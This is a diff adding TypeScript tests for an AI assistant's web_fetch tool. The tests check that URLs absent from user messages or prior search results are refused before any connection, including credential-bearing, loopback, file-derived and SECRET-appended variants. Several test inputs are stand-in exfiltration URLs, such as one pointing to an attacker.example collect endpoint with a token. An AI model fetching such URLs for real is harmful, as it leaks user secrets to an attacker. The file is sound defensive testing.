@@ -23,6 +23,7 @@ test('bloqueia protocolos e destinos privados', async () => {
 // returns a marker, and asserts the guard rejects BEFORE any request is opened
 // (http.request never called, server never hit). No external network.
 import http from 'node:http'
+import https from 'node:https'
 import dns from 'node:dns/promises'
 import { EventEmitter } from 'node:events'
 import { fetchWebPage, urlInPriorContext, looksLikeCredentialUrl, buildUrlProvenance } from './web.ts'
@@ -135,7 +136,7 @@ test('web_fetch não segue redirect de host público para alvo privado', async (
 // resolver, before fetchWebPage, so a refusal opens no socket. `http.request` is mocked and counted.
 
 const PROV = { userText: ['leia https://docs.example.test/guia por favor.'], webResults: ['1. Doc\n   https://news.example.test/a?id=1#frag\n'] }
-const fetchTool = (url: string, prov: { userText: string[]; webResults: string[] }) =>
+const fetchTool = (url: string, prov: { userText: readonly string[]; webResults: readonly string[] }) =>
   invokeTool('tok', { kind: 'web-fetch' } as never, { url }, { email: 'a@x.com', urlProvenance: prov } as never)
 
 test('urlInPriorContext: exact normalized match against user text and web results (fragment ignored)', () => {
@@ -199,6 +200,19 @@ test('web_fetch tool: a URL absent from provenance (no provenance at all) is ref
   assert.equal(request.mock.callCount(), 0)
 })
 
+test('web_fetch provenance refusal makes no connection to a loopback listener', async () => {
+  await withMarkerServer(async (port, hits) => {
+    const out = await invokeTool(
+      'tok',
+      { kind: 'web-fetch' } as never,
+      { url: `http://127.0.0.1:${port}/collect?d=SECRET` },
+      { email: 'a@x.com' } as never,
+    )
+    assert.deepEqual(JSON.parse(out.resultText), { error: 'url_not_in_prior_context' })
+    assert.equal(hits(), 0, 'the listener must receive no request')
+  })
+})
+
 test('web_fetch tool: a credential-looking URL is refused unless it is in a user message', async (t) => {
   const request = t.mock.method(http, 'request')
   const cred = 'https://news.example.test/a?token=abcdefghijklmnop1234'
@@ -207,10 +221,94 @@ test('web_fetch tool: a credential-looking URL is refused unless it is in a user
   assert.equal(request.mock.callCount(), 0)
 })
 
+test('web_fetch: an exact credential-looking URL from a user message reaches safeGet', async (t) => {
+  t.mock.method(dns, 'lookup', async () => [{ address: '127.0.0.1', family: 4 }])
+  const cred = 'https://news.example.test/a?token=abcdefghijklmnop1234'
+  const out = await fetchTool(cred, { userText: [`please read ${cred}`], webResults: [] })
+    .then((r) => r.resultText, (e) => String(e.message))
+  assert.match(out, /resolve para endereço privado/)
+  assert.doesNotMatch(out, /url_not_in_prior_context/)
+})
+
 test('web_fetch tool: URLs from a user message or a prior search result reach safeGet (and get past the provenance check)', async (t) => {
   t.mock.method(dns, 'lookup', async () => [{ address: '127.0.0.1', family: 4 }]) // private → safeGet refuses, but only AFTER the provenance check passed
   for (const url of ['https://docs.example.test/guia', 'https://news.example.test/a?id=1']) {
     const out = await fetchTool(url, PROV).then((r) => r.resultText, (e) => String(e.message))
     assert.doesNotMatch(out, /url_not_in_prior_context/, url)
   }
+})
+
+test('web_fetch: an uploaded-file URL is not user-authored provenance', async (t) => {
+  const fileUrl = 'https://attacker.example/collect?token=abcdefghijklmnop1234'
+  // turn.ts persists this exact attachment shape inside the role=user content.
+  const prov = buildUrlProvenance([{
+    role: 'user',
+    content: `Summarize this document.\n\n### Arquivo: report.txt\n${fileUrl}`,
+  }])
+  t.mock.method(dns, 'lookup', async () => [{ address: '93.184.215.14', family: 4 }])
+  const request = t.mock.method(https, 'request', ((_opts: unknown, onResponse: (res: never) => void) => {
+    type FakeReq = EventEmitter & { setTimeout: () => FakeReq; destroy: () => void; end: () => void }
+    type FakeRes = EventEmitter & { statusCode: number; headers: Record<string, string> }
+    const req = new EventEmitter() as FakeReq
+    req.setTimeout = () => req
+    req.destroy = () => {}
+    req.end = () => {
+      const res = new EventEmitter() as FakeRes
+      res.statusCode = 200
+      res.headers = { 'content-type': 'text/plain' }
+      onResponse(res as never)
+      res.emit('data', Buffer.from('ok'))
+      res.emit('end')
+    }
+    return req
+  }) as unknown as typeof https.request)
+
+  const out = await fetchTool(fileUrl, prov)
+  assert.equal(request.mock.callCount(), 0, 'file-derived URLs must be refused before any socket')
+  assert.deepEqual(JSON.parse(out.resultText), { error: 'url_not_in_prior_context' })
+})
+
+test('web_fetch: appending query, path, userinfo, encoded data or a trailing-dot host to a known URL is refused', async (t) => {
+  const request = t.mock.method(https, 'request', (() => {
+    throw new Error('an appended URL must be rejected before http.request')
+  }) as unknown as typeof https.request)
+  const candidates = [
+    'https://docs.example.test/guia?d=SECRET',
+    'https://docs.example.test/guia/SECRET',
+    'https://docs.example.test/guia?d=%53ECRET',
+    'https://user:password@docs.example.test/guia',
+    'https://docs.example.test./guia?d=SECRET',
+    'https://news.example.test/a?id=1&d=SECRET#frag',
+  ]
+  for (const url of candidates) {
+    const out = await fetchTool(url, PROV)
+    assert.deepEqual(JSON.parse(out.resultText), { error: 'url_not_in_prior_context' }, url)
+  }
+  assert.equal(request.mock.callCount(), 0)
+  assert.equal(urlInPriorContext('HTTPS://DOCS.EXAMPLE.TEST/guia', PROV), true, 'host/scheme case normalizes to the same destination')
+})
+
+test('web_fetch: a payload appended only in the fragment is not transmitted in the request target', async (t) => {
+  t.mock.method(dns, 'lookup', async () => [{ address: '93.184.215.14', family: 4 }])
+  const paths: string[] = []
+  t.mock.method(https, 'request', ((opts: { path: string }, onResponse: (res: never) => void) => {
+    type FakeReq = EventEmitter & { setTimeout: () => FakeReq; destroy: () => void; end: () => void }
+    type FakeRes = EventEmitter & { statusCode: number; headers: Record<string, string> }
+    const req = new EventEmitter() as FakeReq
+    paths.push(opts.path)
+    req.setTimeout = () => req
+    req.destroy = () => {}
+    req.end = () => {
+      const res = new EventEmitter() as FakeRes
+      res.statusCode = 200
+      res.headers = { 'content-type': 'text/plain' }
+      onResponse(res as never)
+      res.emit('data', Buffer.from('ok'))
+      res.emit('end')
+    }
+    return req
+  }) as unknown as typeof https.request)
+
+  await fetchTool('https://docs.example.test/guia#d=SECRET', PROV)
+  assert.deepEqual(paths, ['/guia'])
 })
